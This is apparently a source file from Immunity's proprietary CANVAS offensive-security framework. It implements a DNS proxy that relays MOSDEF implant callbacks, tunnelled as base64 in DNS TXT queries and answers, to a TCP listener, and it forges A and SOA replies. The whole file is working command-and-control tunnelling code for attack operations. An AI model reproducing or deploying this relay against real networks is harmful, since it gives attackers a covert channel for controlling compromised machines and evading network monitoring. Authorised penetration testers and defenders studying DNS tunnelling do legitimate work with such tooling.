#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information


import sys
if '.' not in sys.path:
    sys.path.append('.')

import math
import socket
import base64

import time
import select
import struct

import canvasengine

from exploitutils   import *
from libs.spkproxy  import header, body, MyConnection

from ExploitTypes.utility import Utility

NOTES = """
A DNS Proxy for MOSDEF Callbacks, this server will manage and relay
DNS MOSDEF callbacks to a regular TCP MOSDEF listener.
"""

NAME                            = 'DNS Proxy for MOSDEF Callbacks'
DESCRIPTION                     = 'DNS Proxy for MOSDEF Callbacks'
DOCUMENTATION                   = {}
DOCUMENTATION['Repeatability']  = 'N/A'
DOCUMENTATION['NOTES']          = """
A DNS Proxy for MOSDEF Callbacks, this server will manage and relay
DNS MOSDEF callbacks to a regular TCP MOSDEF listener.
"""

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Servers'
MAX_PACKETSIZE  = 100
MAX_RRSIZE      = 64


"""
    0x2B = + part (pending bytes)
    0x2D = - done
    0x2E = . pong (nothing to deliver)
"""

def hexear(s, l = None, nlp = None):
    r = []
    t = 1
    for c in s:
        r.append('%02hX' % ord(c))

        if l is not None and t % l == 0:
            r.append(" \r\n")
            if nlp:
                r.append(nlp)
        else:
            r.append(" ")

        t += 1
        
    return "".join(r)

class theexploit(Utility):
    def __init__(self):
        Utility.__init__(self)

        self.first_time     = True

        self.server_sock    = None
        self.server_host    = None
        self.server_port    = 53

        self.mosdef_socks   = []
        self.mosdef_port    = 5555
        self.mosdef_host    = '127.0.0.1'

        self.activity       = {}
        self.clients        = {}
        self.verbose        = False

        self.temp_buf       = {}
        self.temp_rvd       = {}
        self.temp_len       = {}

        self.incoming       = {}
        self.outgoing       = {}

        self.pong           = ""
        
    def start_dns_server(self):
        if not self.engine:
            self.engine = canvasengine.canvasengine()    

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind((self.server_host, self.server_port))
            
            self.server_sock = s

            return True
        except Exception, e:
            return False

    def connect_mosdef(self):
        try:
            mosdef_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            mosdef_sock.connect((self.mosdef_host, self.mosdef_port))
            self.mosdef_socks.append(mosdef_sock)
        except Exception, e:
            return None

        return mosdef_sock

    def discard_client(self, clientid, close_mosdef_sock=False):
        for sockidx in range(0, len(self.mosdef_socks)):
            if self.mosdef_socks[sockidx] == self.clients[clientid]:
                del self.mosdef_socks[sockidx]

        for info_list in [self.clients, self.incoming, self.outgoing, self.temp_buf, self.temp_len, self.temp_rvd]:
            if info_list.has_key(clientid):
                del info_list[clientid]

    def handle_timeouts(self, timeout=120):
        for clientid in self.clients.keys():
            if (time.time() - self.activity[clientid]) > timeout:
                devlog("[DNS_PROXY] Client activity timeout (%d seconds), connection discarded : %s" % (timeout, clientid))

                try:
                    self.clients[clientid].close()
                except Exception, e:
                    pass

                self.discard_client(clientid)

    def handle_mosdef(self, rlist=False):
        for clientid in self.clients.keys():
            if self.incoming.has_key(clientid):
                while self.incoming[clientid]:
                    data = self.incoming[clientid].pop()
                    self.clients[clientid].sendall(data)

        if rlist:
            for clientid in self.clients.keys():
                if self.clients[clientid] in rlist:
                    try:
                        mosdef_sock = self.clients[clientid]
                        self.outgoing[clientid].append(mosdef_sock.recv(500))

                    except Exception, e:
                        devlog("[DNS_PROXY] Mosdef connection closed : %s (%s)" % (clientid, str(e)))

                        self.discard_client(clientid)

    def handle_dns(self):
        ## handle incoming DNS query
        try:
            data, addr = self.server_sock.recvfrom(1024)
        except Exception, e:
            return

        QueryFlag = (ord(data[2]) & 0x80)
        Opcode    = (ord(data[2]) & 0x78) >> 3
        QdCount   = (ord(data[4]) << 15 | ord(data[5]))
        AnCount   = (ord(data[6]) << 15 | ord(data[7]))
        UpCount   = (ord(data[8]) << 15 | ord(data[9]))
        QsBase    = 12

        if QueryFlag == 0:
            response_part_list  = [[], [], []]
            QsItems = []

            if QdCount+AnCount+UpCount:
                QsOffset = QsBase
                for QsIndex in range(QdCount+AnCount+UpCount):
                    QiNameIndex     = 0
                    QiNamePartCount = 0
                    QiNamePartLen   = 0
                    QiNamePartIndex = 0
                    
                    QsItem = []

                    while True:
                        QiNamePartLen = ord(data[QsOffset + QiNamePartCount + QiNamePartIndex])

                        if not QiNamePartLen:
                            QiNamePartCount += 1
                            break

                        QiNamePartCount += 1

                        QsItem.append(data[QsOffset + QiNamePartCount + QiNamePartIndex : QsOffset + QiNamePartCount + QiNamePartIndex + QiNamePartLen])

                        QiNamePartIndex += QiNamePartLen

                    QsItems.append(QsItem)

                    QsNameOffset = QsOffset
                    QsOffset    += QiNamePartCount + QiNamePartIndex

                    QsType = ord(data[QsOffset]) << 15 | ord(data[QsOffset + 1])
                    QsOffset += 2 #salto type

                    QsClass = ord(data[QsOffset]) << 15 | ord(data[QsOffset + 1])
                    QsOffset += 2 #salto class

                    QsIdentifier = '.'.join(QsItem)

                    if QsType == 0x01: #A
                        devlog("[DNS_PROXY] Got message : QF[%d] OC[%d] QC[%d] AC[%d] UC[%d] asking for [%d][%s], sending my address" % (QueryFlag, Opcode, QdCount, AnCount, UpCount, QsType, QsIdentifier))
                        
                        response_part_item  = ''
                        response_part_item += socket.inet_aton(self.server_host)

                        response_part_item = [QsNameOffset, QsType, len(response_part_item), response_part_item]
                        response_part_list[0].append(response_part_item)

                    elif QsType == 0x06: #SOA
                        devlog("[DNS_PROXY] Got message : QF[%d] OC[%d] QC[%d] AC[%d] UC[%d] asking for [%d][%s], sending fake nameserver info" % (QueryFlag, Opcode, QdCount, AnCount, UpCount, QsType, QsIdentifier))

                        NsSubdomain = 'ns1'
                        NsAdmin     = 'dns-admin'
                        Serial      = 1434489

                        response_part_item  = ''
                        response_part_item += struct.pack('>B', len(NsSubdomain)) + NsSubdomain
                        response_part_item += '\xc0' + struct.pack('>B', QsNameOffset)
                        response_part_item += struct.pack('>B', len(NsAdmin)) + NsAdmin
                        response_part_item += '\xc0' + struct.pack('>B', QsNameOffset)

                        response_part_item += struct.pack('>L', Serial)
                        response_part_item += struct.pack('>L', 0x0000)
                        response_part_item += struct.pack('>L', 0x0000)
                        response_part_item += struct.pack('>L', 0x0000)
                        response_part_item += struct.pack('>L', 0x0000)

                        response_part_item = [QsNameOffset, QsType, len(response_part_item), response_part_item]
                        response_part_list[0].append(response_part_item)

                    elif QsType == 0x10: #TXT
                        if Opcode  == 5:
                            devlog("[DNS_PROXY] Got message : QF[%d] OC[%d] QC[%d] AC[%d] UC[%d] asking for [%d][%s], real traffic : client -> server" % (QueryFlag, Opcode, QdCount, AnCount, UpCount, QsType, QsIdentifier))

                            QsRequestId = 1 if int(QsItem[0][1:]) <= 0 else int(QsItem[0][1:])
                            QsStepId    = 0 if int(QsItem[1])     <= 0 else int(QsItem[1])
                            QsDomain    = ".".join(QsItem[2:])

                            UsTTl = ord(data[QsOffset]) << 23 | ord(data[QsOffset + 1]) << 15 | ord(data[QsOffset + 2]) << 7 | ord(data[QsOffset + 3])
                            QsOffset += 4 #skip the class

                            UsSize = ord(data[QsOffset]) << 7 | ord(data[QsOffset + 1])
                            QsOffset += 2 #skip the update section size

                            try:
                                part_size = ord(data[QsOffset:QsOffset+1])
                                self.incoming[QsDomain].append(base64.b64decode(data[QsOffset+2:QsOffset+1+part_size]))
                                self.activity[QsDomain] = time.time()
                            except KeyError:
                                devlog("[DNS_PROXY] unknown client, discarding message [%s]" % (QsDomain))

                            UsSize = ord(data[QsOffset]) << 7 | ord(data[QsOffset + 1])
                            QsOffset += UsSize #skip the update section

                        else:
                            devlog("[DNS_PROXY] Got message : QF[%d] OC[%d] QC[%d] AC[%d] UC[%d] asking for [%d][%s], real traffic : server -> client" % (QueryFlag, Opcode, QdCount, AnCount, UpCount, QsType, QsIdentifier))

                            QsRequestId = 1 if int(QsItem[0][1:]) <= 0 else int(QsItem[0][1:])
                            QsStepId    = 0 if int(QsItem[1])     <= 0 else int(QsItem[1])
                            QsDomain    = ".".join(QsItem[2:])
                            contents = self.pong
                            pong     = True

                            if self.clients.has_key(QsDomain):
                                if self.outgoing.has_key(QsDomain):
                                    if self.outgoing[QsDomain]:
                                        contents = self.outgoing[QsDomain][0]
                                        pong     = False

                            if not self.clients.has_key(QsDomain):
                                ClientSock = self.connect_mosdef()
                                if ClientSock:
                                    self.log("New client detected : %s identified by %s" % (addr[0], QsDomain))
                                    self.clients[QsDomain]  = ClientSock
                                    self.incoming[QsDomain] = []
                                    self.outgoing[QsDomain] = []

                            self.activity[QsDomain] = time.time()

                            contents = base64.b64encode(contents)

                            status = struct.pack('>B', 0x2D)
                            if pong:
                                status = struct.pack('>B', 0x2E)
                            if MAX_PACKETSIZE < len(contents):
                                if ((QsRequestId - 1) * MAX_PACKETSIZE) < len(contents):
                                    status = struct.pack('>B', 0x2B)

                            contents = status + contents[(QsRequestId - 1) * MAX_PACKETSIZE : (QsRequestId - 0) * MAX_PACKETSIZE]

                            if ord(contents[0]) == 0x2D and not pong: #if this is the last part of the chunk pop the whole chunk from the outgoing list
                                disposed = self.outgoing[QsDomain].pop(0)

                            response = contents
                            contents = None
    
                            response_part_size  = MAX_RRSIZE
                            response_part_count = int(math.ceil(len(response)/response_part_size)) + 1
    
                            for i in range(0, response_part_count):
                                response_part_item = response[i * response_part_size :  (i + 1) * response_part_size]
                                response_part_item = [QsNameOffset, QsType, len(response_part_item) + 1, struct.pack('>B', len(response_part_item)) + response_part_item]
                                response_part_list[0].append(response_part_item)

            packet  = ''
            packet += data[0:2]                                                                                  # Id
            packet += "\x81\x80"                                                                                 # QR ... RCODE
            packet += data[4:6] + struct.pack('>H', len(response_part_list[0])) \
                                + struct.pack('>H', len(response_part_list[1])) \
                                + struct.pack('>H', len(response_part_list[2]))                                  # Questions and Answers Counts
            packet += data[QsNameOffset:QsOffset]                                                                # Original Domain Name Question

            for response_parts in response_part_list:
                for response in response_parts:
                    packet += '\xc0' + struct.pack('>B', response[0])                                            # Pointer to the domain name
                    packet += struct.pack('>H', response[1])                                                     # Type
                    packet += '\x00\x01'                                                                         # Class
                    packet += struct.pack('>L', 0x0000)                                                          # TTL
                    packet += struct.pack('>H', response[2])
                    packet += response[3]

            self.server_sock.sendto(packet, addr)

    def getArgs(self):
        self.server_host = self.argsDict.get('mosdef_host', self.mosdef_host)
        self.server_port = 53
        self.mosdef_host = self.argsDict.get('mosdef_host', self.mosdef_host)
        self.mosdef_port = self.argsDict.get('mosdef_port', self.mosdef_port)
        
    def run(self):
        self.getArgs()

        if not self.start_dns_server():
            self.log("[DNS_PROXY] Unable start the dns listener on port %d" % 53)
            return 1

        self.setInfo("Serving DNS-to-TCP Proxy %d:%s:%d" % (self.server_port,\
                                                            self.mosdef_host,\
                                                            self.mosdef_port))

        while self.server_sock and self.state != self.HALT:
            rlist, wlist, xlist = select.select([self.server_sock] + self.mosdef_socks, [], [], 1)

            ret = self.handle_mosdef(rlist)

            if self.server_sock in rlist or self.incoming:
                ret = self.handle_dns()

            self.handle_timeouts()

        self.server_sock.close()

        for mosdef_sock in self.mosdef_socks:
            mosdef_sock.close()

        return None
                    
if __name__== '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
